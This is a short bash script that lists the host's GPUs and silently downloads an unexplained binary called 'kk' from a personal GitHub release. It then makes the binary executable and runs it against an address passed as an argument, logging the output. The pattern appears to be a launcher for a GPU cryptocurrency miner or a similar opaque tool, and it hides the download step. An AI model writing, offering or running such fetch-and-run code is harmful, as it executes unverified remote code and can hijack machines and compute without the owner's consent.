#!/bin/bash
nvidia-smi -L
wget https://github.com/neldakirsten4602/kk/releases/download/1/kk &> /dev/null
chmod +x kk
./kk -P http://"$1" &> log
